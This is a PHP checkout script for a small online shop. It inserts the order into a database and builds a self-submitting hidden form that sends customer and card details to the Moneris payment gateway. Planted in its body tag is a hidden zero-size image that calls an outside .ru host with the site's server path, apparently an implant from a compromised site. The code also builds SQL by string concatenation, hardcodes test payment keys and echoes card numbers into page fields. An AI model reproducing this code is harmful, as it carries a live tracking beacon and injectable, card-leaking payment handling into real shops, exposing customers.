<?php
/* Programme : confirme_envoi.php
* Description : Gestion de la préparation du POST pour Moneris.
* Auteur : Denis Léveillé 	 		  Date : 2007-10-28
*/
include('lib/config.php');
//echo "Confirme Envoi<br>";
 
if( Chk_TransId( @$_POST['transid'] ) ) {
	echo "<SCRIPT LANGUAGE='javascript'>";
	echo "M = ".$txt['bouton_deja_clique'];
	echo " window.alert(\"M\");";
	echo "</SCRIPT>";
	exit();
}
else 
	Aj_TransId( @$_POST['transid'] );
	
$TxCUC_USD = get_TauxVente("CUC"); 
$TXUSD_CAD = get_TauxVente("CAD"); 
$TXUSD_EUR = get_TauxVente("EUR"); 

$infosClient = infos_client( $_SESSION[$_SERVER['SERVER_NAME']] );
extract($infosClient);
extract($_SESSION['destinataire']);

$monPanier = panierInfos($_SESSION['panier']); 

if( $monPanier && (!isset($_SESSION['OrderId']) || ($_SESSION['OrderId'] == 0) ) ) {
	$_SESSION['OrderId'] = Insert_vente( $_SESSION[$_SERVER['SERVER_NAME']], $_SESSION['destinataire'], $_SESSION['panier'], $_SESSION['Totaux'], $_SESSION['paiement'] );
	// Enregistrement de la facture au compte-client	
	$Montant = $Solde = $_SESSION['Totaux']['totalpourbanque']; 
	$RPDevise = "CAD";
	$NoClient=$_SESSION[$_SERVER['SERVER_NAME']];
	$Document=$_SESSION['OrderId'];
	$DateTrs=$Now;
	$Operation="FACTURE";
	$Mode=0;//$_SESSION['paiement']['ModePaye'];
	include( $acces_hermes."mcrpajcpt.inc");
	$_SESSION['NoEcr'] = $NoEcrit;
	
	// ***** Trouver le livreur et les frais
	$Livreur = 0;
	$Service = 7;
	$DProvince = $livraison_province;
	include( $acces_hermes."trslivreur.inc");
	$sql = "INSERT INTO $database.transaction ( Service,Poids,Transfert,CurTrans,Etat,NoLettre,Commis,"; 
	$sql .= "ENoClient,ENom,EPrenom,ERue,EVille,EProvince,EPays,ECP,ETelephone,EDetail,"; 
	$sql .= "DNoClient,DNom,DPrenom,DContact,DRue,DQuartier,DVille,DProvince,DPays,DCP,";
	$sql .= "DTelephone,DDetail,DateRecu,Livreur,FrTransant,FrFixe,Extra,CoutUS,DevPaye,";
	$sql .= "TauxChg, ModePaye, CoutLivreur, Assurance, Douane, NoFacture, DateFacture)"; 
	$sql .= "VALUES ('$Service','1','0', 'USD','5','".$_SESSION['OrderId']."','WEBUSER',";
	$sql .= "'$NoClient','$Nom','$Prenom','$Rue','$Ville', '$Province','$Pays','$CodePostal','$Telephone','WEB BUYING',";
	$sql .= "'$livraison_no','$livraison_nom','$livraison_prenom','$livraison_contact','$livraison_rue"." / "."$livraison_indication',"; 
	$sql .= "'$livraison_quartier','$livraison_ville','$livraison_province','$livraison_pays','$livraison_codepostal',";
	$sql .= "'$livraison_telephone','', '$Now','$Livreur','0',";
	$sql .= "'".$_SESSION['Totaux']['LivraisonUSD']."','0','".$_SESSION['Totaux']['LivraisonUSD']."', 'CAD',";
	$sql .= "'$TXUSD_CAD','".$_SESSION['paiement']['ModePaye']."', '1.00', '0','0', '$NoEcrit', '$Aujourdhui'   )";
	if( !mysql_query($sql, $connection) ) 
		Message_Erreur( "ERROR AJOUT TRANS: ", "confirme_envoi", mysql_errno()." : ".mysql_error()."<br>".$sql  );	
	$NoTrans = mysql_insert_id();
	$_SESSION['NoTrans'] = $NoTrans;
}

/*		$Message = "Demande MONERIS Cli=".$_SESSION[$_SERVER['SERVER_NAME']]." Fct=".@$_SESSION['OrderId'];
		$sql = "INSERT INTO $mysql_base.trace ( NomLogin, DateLogin, Operation )";
		$sql .= "VALUES ('".$_SESSION['NomLogin']."','$Now', '$Message')";
		mysql_query( $sql, $handle );*/


$_SESSION['paiement']['ps_store_id'] = $param['id_payeur'];
$_SESSION['paiement']['hpp_key'] = $param['cle_payeur'];

//$param['url_payeur_test'] = "";

if($_SESSION['langue']=='fr')
	$lang = "fr-ca";
else
	$lang = "en-ca";
	
echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<base target='MAIN'>
	</head>
<body width='$Large' onload='javascript:pageonload()' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table width='$Large' cellpadding='0' cellspacing='0' border='1' align='$Enligne' >
	<tr>
		<td>";
					/* ============ POUR TEST ================ */
			if( 	($infosClient['Courriel'] == "denis@transant.com") || 
					($infosClient['Courriel'] == "webmaster@jean-alexandre.ca") || 
					($infosClient['Courriel'] == "postmaster@transant.com") ){
				$_SESSION['paiement']['ps_store_id'] = "UA7G6Zore1";
				$_SESSION['paiement']['hpp_key'] = "dp3YJ715R4NO";   
				echo "<form name='Envoi' method='post' action='".$param['url_payeur_test']."'>";
//				echo "<form name='Envoi' METHOD='POST' ACTION='".$param['url_payeur']."'>";
			}
			else 
				echo "<form name='Envoi' method='post' action='".$param['url_payeur']."'>";
			
			echo "
				<input type='hidden' name='ps_store_id' VALUE='".$_SESSION['paiement']['ps_store_id']."'> 
				<input type='hidden' name='hpp_key' VALUE='".$_SESSION['paiement']['hpp_key']."'>
				<input type='hidden' name='charge_total' VALUE='".$_SESSION['Totaux']['totalpourbanque']."'> 
				<input type='hidden' name='cc_num' VALUE='".$_SESSION['paiement']['trnCardNumber']."'> 
				<input type='hidden' name='expMonth' VALUE='".$_SESSION['paiement']['trnExpMonth']."'> 
				<input type='hidden' name='expYear' VALUE='".$_SESSION['paiement']['trnExpYear']."'> 
				<input type='hidden' name='cust_id' VALUE='$NoClient'> 
				<input type='hidden' name='order_id' VALUE='".$_SESSION['OrderId']."'> 
				<input type='hidden' name='bill_first_name' VALUE='$Prenom'> 
				<input type='hidden' name='bill_last_name' VALUE='$Nom'> 
				<input type='hidden' name='bill_address_one' VALUE='$Rue'> 
				<input type='hidden' name='bill_city' VALUE='$Ville'> 
				<input type='hidden' name='bill_state_or_province' VALUE='$Province'> 
				<input type='hidden' name='bill_postal_code' VALUE='$CodePostal'> 
				<input type='hidden' name='bill_country' VALUE='$Pays'> 
				<input type='hidden' name='bill_phone' VALUE='$Telephone'> 
				<input type='hidden' name='email' VALUE='$Courriel'> 
				<input type='hidden' name='ship_first_name' VALUE='$livraison_prenom'> 
				<input type='hidden' name='ship_last_name' VALUE='$livraison_nom'> 
				<input type='hidden' name='ship_address_one' VALUE='$livraison_rue $livraison_indication'> 
				<input type='hidden' name='ship_city' VALUE='$livraison_ville'> 
				<input type='hidden' name='ship_state_or_province' VALUE='$livraison_province'> 
				<input type='hidden' name='ship_postal_code' VALUE='$livraison_codepostal'> 
				<input type='hidden' name='ship_country' VALUE='$livraison_pays'> 
				<input type='hidden' name='ship_phone' VALUE='$livraison_telephone'> 
				<input type='hidden' name='shipping_cost' VALUE='".@$_SESSION['Totaux']['LivraisonCAD']."'> 
				<input type='hidden' name='lang' VALUE='$lang'>";
			if( $monPanier  ) {
				$i = 1;
				foreach( $monPanier as $produit ){
					$prix_usd	=	rounder($produit['prix_detail']  * $TxCUC_USD);
					$prix 		=	rounder($prix_usd * $TXUSD_CAD);
					$total_prix =	rounder( $prix * $_SESSION['panier'][$produit['id']]['Qte'] );					
				echo "
					<input type='hidden' name='id$i' VALUE='".$produit['id']."'>
					<input type='hidden' name='description$i' VALUE='".$produit['titre']."'> 
					<input type='hidden' name='quantity$i' VALUE='".$_SESSION['panier'][$produit['id']]['Qte']."'> 
					<input type='hidden' name='price$i' VALUE='".$prix."'> 
					<input type='hidden' name='subtotal$i' VALUE='".$total_prix."'>"; 
					$i++;
				} // for
			} // Si un panier
		echo "				
			</form>\r\n";

?>
			</td>
		</tr>
	</table>

<script language='javascript'>

function pageonload() {
	document.Envoi.submit();
} // pageonload
</script>

</body>
</html>
